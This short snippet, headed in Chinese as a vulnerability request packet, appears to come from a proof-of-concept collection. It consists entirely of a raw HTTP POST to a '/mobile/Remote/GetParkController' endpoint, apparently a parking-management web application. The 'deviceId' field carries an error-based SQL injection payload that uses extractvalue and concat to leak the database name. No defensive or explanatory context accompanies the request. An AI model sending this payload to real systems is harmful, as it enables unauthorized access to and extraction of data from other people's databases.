## 漏洞数据包

```
POST /mobile/Remote/GetParkController HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
 
deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'
```

